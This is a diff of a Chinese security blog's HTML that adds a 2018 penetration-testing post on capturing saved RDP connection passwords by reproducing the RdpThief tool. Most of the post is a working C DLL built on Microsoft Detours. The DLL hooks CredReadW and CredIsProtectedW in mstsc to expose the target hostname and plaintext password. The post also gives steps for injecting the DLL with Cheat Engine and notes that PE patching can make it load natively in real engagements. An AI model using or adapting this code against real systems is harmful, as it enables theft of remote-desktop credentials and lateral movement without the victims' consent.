@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="kongdewei.cn" />
+  <meta name="keywords" content="渗透," />
 
 
 
@@ -79,15 +79,55 @@
 
 
 
-<meta name="description" content="YWRtaW5Aa29uZ2Rld2VpLmNu">
-<meta property="og:type" content="website">
-<meta property="og:title" content="草莓的博客">
-<meta property="og:url" content="http://www.kongdewei.cn/tags/安全攻防/index.html">
+<meta name="description" content="前言渗透过程中，当发现RDP连接中有记录，但密码未保存，找到RdpThief，本文是一篇利用复现。
+#实践
+
+系统windows 7 32
+工具API MonitorCheat Engine6.7RdpThief
+
+将API Monitor，附加选择mstsc进程，如图所示：
+RDP点击连接，并查看API Monitor列表
+如果未监听到，请在左侧API帅选器中勾选如图
+可以看到，连接IP出现在C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="获取RDP连接中密码的方法">
+<meta property="og:url" content="http://www.kongdewei.cn/2018/01/15/获取RDP连接中密码的方法/index.html">
 <meta property="og:site_name" content="草莓的博客">
-<meta property="og:description" content="YWRtaW5Aa29uZ2Rld2VpLmNu">
+<meta property="og:description" content="前言渗透过程中，当发现RDP连接中有记录，但密码未保存，找到RdpThief，本文是一篇利用复现。
+#实践
+
+系统windows 7 32
+工具API MonitorCheat Engine6.7RdpThief
+
+将API Monitor，附加选择mstsc进程，如图所示：
+RDP点击连接，并查看API Monitor列表
+如果未监听到，请在左侧API帅选器中勾选如图
+可以看到，连接IP出现在C">
+<meta property="og:image" content="http://www.kongdewei.cn/images/jt/6671501-c3cf4f361cf0a752.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/jt/6671501-839e4eb942b3e86d.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/jt/6671501-078070b69409f2b4.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-2c115186cf0e5592.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-60f8f9b52bab4e19.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-51fdb06713b5d29e.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-81e3ab6dad3e89d8.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-3f913c4fa3236af9.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-4ab2ef9c46c2a9cd.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-2576600228e8356d.png">
+<meta property="og:image" content="http://www.kongdewei.cn/images/it/6671501-c199db5b4356ecf4.png">
+<meta property="og:updated_time" content="2020-03-09T07:14:10.736Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="草莓的博客">
-<meta name="twitter:description" content="YWRtaW5Aa29uZ2Rld2VpLmNu">
+<meta name="twitter:title" content="获取RDP连接中密码的方法">
+<meta name="twitter:description" content="前言渗透过程中，当发现RDP连接中有记录，但密码未保存，找到RdpThief，本文是一篇利用复现。
+#实践
+
+系统windows 7 32
+工具API MonitorCheat Engine6.7RdpThief
+
+将API Monitor，附加选择mstsc进程，如图所示：
+RDP点击连接，并查看API Monitor列表
+如果未监听到，请在左侧API帅选器中勾选如图
+可以看到，连接IP出现在C">
+<meta name="twitter:image" content="http://www.kongdewei.cn/images/jt/6671501-c3cf4f361cf0a752.png">
 
 
 
@@ -117,13 +157,13 @@
 
 
 
-  <link rel="canonical" href="http://www.kongdewei.cn/tags/安全攻防/"/>
+  <link rel="canonical" href="http://www.kongdewei.cn/2018/01/15/获取RDP连接中密码的方法/"/>
 
 
 
 
 
-  <title>标签: 安全攻防 | 草莓的博客</title>
+  <title>获取RDP连接中密码的方法 | 草莓的博客</title>
   
 
 
@@ -152,7 +192,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -270,54 +310,189 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>安全攻防<small>标签</small>
-        </h2>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.kongdewei.cn/2018/01/15/获取RDP连接中密码的方法/">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="草莓丶">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://www.kongdewei.cn/images/tx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="草莓的博客">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2017/08/11/看我如何搭建一款方便易用的云WAF/" itemprop="url">
-              
-                <span itemprop="name">看我如何搭建一款方便易用的云WAF</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">获取RDP连接中密码的方法</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-08-11T11:46:13+08:00"
-              content="2017-08-11" >
-          08-11
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-15T15:08:12+08:00">
+                2018-01-15
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/RDP/" itemprop="url" rel="index">
+                    <span itemprop="name">RDP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透过程中，当发现RDP连接中有记录，但密码未保存，找到RdpThief，本文是一篇利用复现。</p>
+<p>#实践</p>
+<blockquote>
+<p>系统<br>windows 7 32</p>
+<p>工具<br><a href="http://www.rohitab.com/apimonitor" target="_blank" rel="external">API Monitor</a><br><a href="https://www.cheatengine.org/" target="_blank" rel="external">Cheat Engine6.7</a><br><a href="https://github.com/0x09AL/RdpThief" target="_blank" rel="external">RdpThief</a></p>
+</blockquote>
+<p>将API Monitor，附加选择mstsc进程，如图所示：<br><img src="/images/jt/6671501-c3cf4f361cf0a752.png" alt="监听RDP进程"></p>
+<p>RDP点击连接，并查看API Monitor列表<br><img src="/images/jt/6671501-839e4eb942b3e86d.png" alt="RDP连接"></p>
+<p>如果未监听到，请在左侧API帅选器中勾选如图<br><img src="/images/jt/6671501-078070b69409f2b4.png" alt="抓取RDP调用API过程"></p>
+<p>可以看到，连接IP出现在CredReadW的调用中，直接HOOK这个位置就可以获取连接IP，方法很多可以E语言实现比较简单，这里我们参考RdpThief源码，使用<a href="https://github.com/Microsoft/Detours" target="_blank" rel="external">Detours</a><br>框架来实现HOOK。</p>
+<p><img src="/images/it/6671501-2c115186cf0e5592.png" alt="Detours目录"><br>首先编译框架，利用VS自带工具VsDevCmd.bat，cd到Detours的src目录<br>使用nmake命令编译，并安装框架<br><img src="/images/it/6671501-60f8f9b52bab4e19.png" alt="编译安装框架"></p>
+<p><img src="/images/it/6671501-51fdb06713b5d29e.png" alt="代码"></p>
+<p>这里直接使用MessageBoxW将HOOK的结果弹出，查看效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dpapi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincred.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strsafe.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;subauth.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SECURITY_WIN32 </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sspi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"crypt32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Advapi32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Secur32.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI *OriginalCredReadW)</span><span class="params">(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)</span> </span>= CredReadW;</div><div class="line"><span class="function">BOOL <span class="title">HookedCredReadW</span><span class="params">(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)</span></span></div><div class="line">&#123;</div><div class="line">	MessageBoxW(<span class="literal">NULL</span>, TargetName,<span class="string">L"Hostname"</span>,<span class="number">0</span>);</div><div class="line">	<span class="keyword">return</span> OriginalCredReadW(TargetName, Type, Flags, Credential);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">BOOL</span><span class="params">(WINAPI *OriginalCredIsProtectedW)</span><span class="params">(LPWSTR pszProtectedCredentials, CRED_PROTECTION_TYPE *pProtectionType)</span> </span>= CredIsProtectedW;</div><div class="line"><span class="function">BOOL <span class="title">HookedCredIsProtectedW</span><span class="params">(LPWSTR pszProtectedCredentials, CRED_PROTECTION_TYPE *pProtectionType)</span></span></div><div class="line">&#123;</div><div class="line">	MessageBoxW(<span class="literal">NULL</span>, pszProtectedCredentials, <span class="string">L"Password"</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">return</span> OriginalCredIsProtectedW(pszProtectedCredentials, pProtectionType);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (DetourIsHelperProcess()) &#123;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;</div><div class="line">		DetourRestoreAfterWith();</div><div class="line">		DetourTransactionBegin();</div><div class="line">		DetourUpdateThread(GetCurrentThread());</div><div class="line">		DetourAttach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);</div><div class="line">		DetourAttach(&amp;(PVOID&amp;)OriginalCredIsProtectedW, HookedCredIsProtectedW);</div><div class="line">		DetourTransactionCommit();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH) &#123;</div><div class="line">		DetourTransactionBegin();</div><div class="line">		DetourUpdateThread(GetCurrentThread());</div><div class="line">		DetourDetach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);</div><div class="line">		DetourDetach(&amp;(PVOID&amp;)OriginalCredIsProtectedW, HookedCredIsProtectedW);</div><div class="line">		DetourTransactionCommit();</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这2个坑点，第1需要选择多线程编译模式，第2编译要用Release否则注入后程序会崩溃。<br><img src="/images/it/6671501-81e3ab6dad3e89d8.png" alt="多线程/MT"></p>
+<p><img src="/images/it/6671501-3f913c4fa3236af9.png" alt="Release"></p>
+<p>编译后，使用Cheat Engine将DLL注入mstsc进程，真实项目中，可通过PE修改方式直接使mstsc原生调用DLL。<br><img src="/images/it/6671501-4ab2ef9c46c2a9cd.png" alt="注入DLL"></p>
+<p><img src="/images/it/6671501-2576600228e8356d.png" alt="获取服务器地址"></p>
+<p><img src="/images/it/6671501-c199db5b4356ecf4.png" alt="获取服务器密码"></p>
+<p>#参考链接<br><a href="https://mp.weixin.qq.com/s/4CRBFqDLzjyziNkz17-c5A" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CRBFqDLzjyziNkz17-c5A</a></p>
+<p><a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/" target="_blank" rel="external">https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</a></p>
+<p><a href="https://github.com/0x09AL/RdpThief" target="_blank" rel="external">https://github.com/0x09AL/RdpThief</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/13/看我如何使用yara扫描webshell/" rel="next" title="看我如何使用yara扫描webshell">
+                <i class="fa fa-chevron-left"></i> 看我如何使用yara扫描webshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -325,6 +500,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -345,8 +524,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -442,6 +630,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -589,6 +793,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
 
   
 
